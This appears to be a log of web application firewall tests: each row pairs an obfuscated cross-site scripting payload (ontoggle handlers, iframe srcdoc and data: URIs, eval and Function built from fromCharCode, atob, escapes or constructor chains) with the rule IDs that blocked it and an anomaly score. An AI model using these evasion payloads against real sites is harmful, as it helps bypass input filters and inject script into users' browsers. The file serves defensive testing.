1514,"<details open ontoggle=setTimeout(function(){eval(String[`fromCharCode`](97,108,101,114,116,40,49,41))},0)>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o42,7v217,107 || o45,61v217,107 || o34,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603457688.153291
1517,"<details open ontoggle=setTimeout(function(){globalThis['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"933210,934100,941100,941120,949110","o33,84v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603457923.660159
1518,"<details open ontoggle=setTimeout(function(){this['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o33,78v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,12v217,112t:urlDecodeUni,t:compressWhitespace || ",25,177603458051.160051
1522,"<details open ontoggle=setTimeout(function(){(0,eval)(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"933210,934100,941100,941120,949110","o33,74v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603458414.418222
1526,"<details open ontoggle=setTimeout(function(){eval(unescape('%61%6c%65%72%74%28%31%29'))},0)>",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o42,7v217,92 || o45,46v217,92 || o34,11v217,92 || o34,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603458890.805771
1530,"<iframe src=""data:text/html,<script>setTimeout(function(){(function(){}).constructor('al'+'ert(1)')()},0)</script>"">",0,1,block,10,"932100,933210,934100,934100,941100,941110,941130,941160,941170,949110","o55,12v217,116 || o46,59v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,116 || o47,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603459219.399588
1533,"<iframe src=""data:text/html,<script>setTimeout(function(){self['Function']('al'+'ert(1)')()},0)</script>"">",0,1,block,10,"933210,934100,934100,941100,941110,941130,941160,941170,941370,949110","o46,49v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,106 || o47,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,16v217,106t:urlDecodeUni,t:compressWhitespace || ",45,177603459692.342375
1534,"<iframe src=""data:text/html,<script>setTimeout(function(){Function('al'+'\u0065'+'rt(1)')()},0)</script>"">",0,1,block,9,"933210,934100,934100,941100,941110,941130,941160,941170,949110","o84,11v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,106 || o47,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603459756.230880
1537,"<iframe src=""data:text/html,<script>setTimeout(function(){Function('al'+'ert'+'(1)')()},0)</script>"">",0,1,block,9,"933210,934100,934100,941100,941110,941130,941160,941170,949110","o46,44v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,101 || o47,11v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,17760346004.894247
1538,"<iframe src=""data:text/html,<script>setTimeout(function(){Function(['al','ert','(1)'].join(''))()},0)</script>"">",0,1,block,8,"933210,934100,941100,941110,941130,941160,941170,949110","o80,21v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603460139.639811
1539,"<iframe src=""data:text/html,<script>setTimeout(function(){Function(`al`+`ert(1)`)()},0)</script>"">",0,1,block,8,"934100,934100,941100,941110,941130,941160,941170,949110","o47,11v217,98 || o47,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603460250.901079
1540,"<iframe src=""data:text/html,<script>setTimeout(function(){Function.apply(null,['al'+'ert(1)'])()},0)</script>"">",0,1,block,9,"933210,934100,934100,941100,941110,941130,941160,941170,949110","o78,22v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,111 || o47,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603460350.759339
1542,"<iframe src=""data:text/html,<script>setTimeout(function(){Function(atob('YWxlcnQoMSk='))()},0)</script>"">",0,1,block,7,"934100,941100,941110,941130,941160,941170,949110","o47,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603460567.532479
1544,"<iframe src=""data:text/html,<script>setTimeout(function(){Function('a'+'l'+'e'+'r'+'t'+'(1)')()},0)</script>"">",0,1,block,9,"933210,934100,934100,941100,941110,941130,941160,941170,949110","o46,53v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,110 || o47,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603460745.554004
1546,"<iframe src=""data:text/html,<script>setTimeout(function(){Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()},0)</script>"">",0,1,block,8,"933210,934100,941100,941110,941130,941160,941170,949110","o46,79v217,136t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,136 || v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17760346105.006200
1547,"<iframe srcdoc=""<script>(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,109 || o22,62v217,109t:urlDecodeUni,t:cmdLine || o24,65v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || o25,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603461198.055483
1548,"<iframe srcdoc=""<script>(function(){[].constructor.constructor('al'+'ert(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,103 || o22,56v217,103t:urlDecodeUni,t:cmdLine || o24,59v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || o25,11v217,103t:urlDecodeUni || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603461248.043407
1549,"<iframe srcdoc=""<script>(function(){top['Function']('al'+String.fromCharCode(101)+'rt(1)')()})()</script>""></iframe>",0,1,block,11,"932100,932105,932130,933210,934100,934100,941100,941110,941160,941370,949110","o23,10v217,116 || o33,6v217,116 || o22,67v217,116t:urlDecodeUni,t:cmdLine || o24,72v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || o25,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,116t:urlDecodeUni,t:compressWhitespace || ",50,177603461359.830388
1554,"<iframe srcdoc=""<script>(function(){Function('al'+String.fromCharCode(0x65)+'rt(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,110 || o22,63v217,110t:urlDecodeUni,t:cmdLine || o24,66v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || o25,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603461868.258384
1555,"<iframe srcdoc=""<script>(function(){Function(`al${String.fromCharCode(101)}rt(1)`)()})()</script>""></iframe>",0,1,block,7,"932100,932130,934100,941100,941110,941160,949110","o23,10v217,108 || o22,65v217,108t:urlDecodeUni,t:cmdLine || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603461930.494707
1556,"<iframe srcdoc=""<script>(function(){this['Function']('al'+'ert(1)')()})()</script>""></iframe>",0,1,block,10,"932100,932130,933210,934100,934100,941100,941110,941160,941370,949110","o23,10v217,93 || o22,44v217,93t:urlDecodeUni,t:cmdLine || o24,49v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,16v217,93t:urlDecodeUni,t:compressWhitespace || ",45,177603462121.503838
1557,"<iframe srcdoc=""<script>(function(){globalThis['Function']('al'+'ert(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,99 || o22,50v217,99t:urlDecodeUni,t:cmdLine || o24,55v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603462294.627749
1559,"<iframe srcdoc=""<script>(function(){Function('al'+'\u0065'+'rt(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,93 || o22,43v217,93t:urlDecodeUni,t:cmdLine || o62,11v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603462472.871910
1560,"<iframe srcdoc=""<script>(function(){(0,Function)('al'+'ert(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,89 || o22,42v217,89t:urlDecodeUni,t:cmdLine || o24,45v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603462570.350812
1562,"<iframe srcdoc=""<script>(function(){Function.constructor.constructor('al'+'ert(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,109 || o22,62v217,109t:urlDecodeUni,t:cmdLine || o24,65v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || o25,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603462760.192721
1563,"<iframe srcdoc=""<script>(function(){parent['Function']('al'+String.fromCharCode(101)+'rt(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,119 || o22,70v217,119t:urlDecodeUni,t:cmdLine || o24,75v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || o25,11v217,119t:urlDecodeUni || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603462920.588773
1564,"<iframe srcdoc=""<script>(function(){frames['Function']('al'+String.fromCharCode(101)+'rt(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,119 || o22,70v217,119t:urlDecodeUni,t:cmdLine || o24,75v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || o25,11v217,119t:urlDecodeUni || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603463032.803161
1565,"<iframe srcdoc=""<script>(function(){(function(){}).constructor('al'+'ert(1)')()})()</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,103 || o22,56v217,103t:urlDecodeUni,t:cmdLine || o24,59v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || o25,11v217,103t:urlDecodeUni || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603463131.579105
1566,"<iframe srcdoc=""<script>(function(){(0,eval)('al'+String.fromCharCode(101)+'rt(1)')})();</script>""></iframe>",0,1,block,9,"932100,932130,933210,934100,934100,941100,941110,941160,949110","o23,10v217,108 || o22,60v217,108t:urlDecodeUni,t:cmdLine || o24,63v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || o25,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603463282.626748
1568,"<iframe srcdoc=""<script>(new Function('a'+'lert\u00281\u0029'))()</script>"">",0,1,block,7,"932130,934100,934100,941100,941110,941160,949110","o22,36v217,76t:urlDecodeUni,t:cmdLine || o25,13v217,76 || o25,13v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603463494.983235
1575,"<iframe srcdoc=""<script>self['Function']('a'+'lert(1)')()</script>"">",0,1,block,6,"933210,941100,941110,941160,941370,949110","o28,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,68t:urlDecodeUni,t:compressWhitespace || ",25,177603464298.493963
1576,"<iframe srcdoc=""<script>(new&#32;Function&#40;&#39;a&#39;&#43;&#39;lert&#40;1&#41;&#39;&#41;&#41;&#40;&#41;</script>"">",0,1,block,5,"941100,941110,941160,942100,949110","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,118 || ",20,177603464335.418314
1578,"<iframe srcdoc=""<script>(new Function('a'+'lert\50\61\51'))()</script>"">",0,1,block,7,"932130,934100,934100,941100,941110,941160,949110","o22,31v217,72t:urlDecodeUni,t:cmdLine || o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603464555.961727
1581,"<iframe srcdoc=""<script>globalThis['Function']('a'+'lert(1)')()</script>"">",0,1,block,5,"933210,941100,941110,941160,949110","o34,29v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603464951.648281
1583,"<iframe srcdoc=""<script>(new Function(['a','lert',String.fromCharCode(40),'1',')'].join('')))()</script>"">",0,1,block,6,"932130,934100,941100,941110,941160,949110","o22,62v217,106t:urlDecodeUni,t:cmdLine || o25,13v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603465156.032513
1586,"<iframe srcdoc=""<script>(new Function('a\154ert\0501\051'))()</script>"">",0,1,block,6,"932130,934100,941100,941110,941160,949110","o22,33v217,72t:urlDecodeUni,t:cmdLine || o25,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760346540.252830
1588,"<iframe srcdoc=""<script>[].constructor.constructor('ale'+'rt(1)')()</script>"">",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,78 || v217,78t:urlDecodeUni || ",25,177603465618.115136
1599,"<iframe srcdoc=""<script>[]['constructor']['constructor']('a'+'lert(1)')()</script>"">",0,1,block,5,"933210,941100,941110,941160,949110","o24,49v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603466878.564612
